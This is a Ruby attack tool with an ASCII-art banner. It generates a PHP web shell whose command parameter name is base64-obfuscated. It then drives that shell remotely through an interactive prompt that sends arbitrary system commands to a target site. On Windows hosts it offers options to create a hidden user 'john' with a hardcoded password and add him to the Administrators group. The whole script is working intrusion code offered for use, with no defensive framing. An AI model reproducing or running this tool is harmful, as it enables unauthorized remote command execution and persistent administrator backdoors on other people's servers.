#/usr/bin/ruby -w
require "open-uri"
require "colorize"

$name = ARGV[0]
$uri = ARGV[1]


if ($name == nil) and ($uri == nil ) then 
puts "
 ** **
**   **
**   **         ****
**   **       **   ****
**  **       *   **   **
 **  *      *  **  ***  **
  **  *    *  **     **  *
   ** **  ** **        **
   **   **  **
  *           *
 *             *
*    0     0    *
*   /   @   \   *
*   \__/ \__/   *
  *     W     *
    **     **
      *****
                     USAGE :  ra.rb start <site>/shell.php
                              ra.rb shell.php


                               <whelp>
      ".red
        

	end

if ($name != nil ) and ($uri == nil ) then

	$shell = """ <?php echo system($_GET[base64_decode('Y21k')]);?>"""
   $f = File.new("#{$name}","w")
   $f.write($shell)
   $f.close

   puts "The File #{$name} Has been created succesufuly ! ".green

end

if ($name == "start") and ($uri != nil ) then
$inf = open("http://#{$uri}?cmd=ver").read
$inf2 = open("http://#{$uri}?cmd=uname -a ").read
puts "#{$inf}#{$inf2}".green  
while true do 



print "<@root> ".red
ARGV.clear
$command = gets.chomp

if $command == "whelp" then 
       puts " [0] Creat User "
       puts " [1] Add User to ADMIN_GROUP"
       puts " [2] Show users "
      

      if $inf["Microsoft Windows"].nil? then 
       
  else
      	while true do 
       
       puts  "------------------------------------ "
       print "@WINDOWS :: ".green
       $option = gets.chomp
       puts  "------------------------------------ "
     
       if $option == "0" then 
       puts open("http://#{$uri}?cmd=net user john 14243454 /add ").read
       puts "User Jhon Has benn created with 14243454 password ! ".green
                         
end
      if $option == "1" then 
        puts open("http://#{$uri}?cmd=net localgroup Administrators john /add ").read
        puts "user John added to group ".green
end
   if $option == "2" then 
    puts open("http://#{$uri}?cmd=net users ").read
   end
end

end
end


$html = open("http://#{$uri}?cmd=#{$command}").read

puts $html
end

	end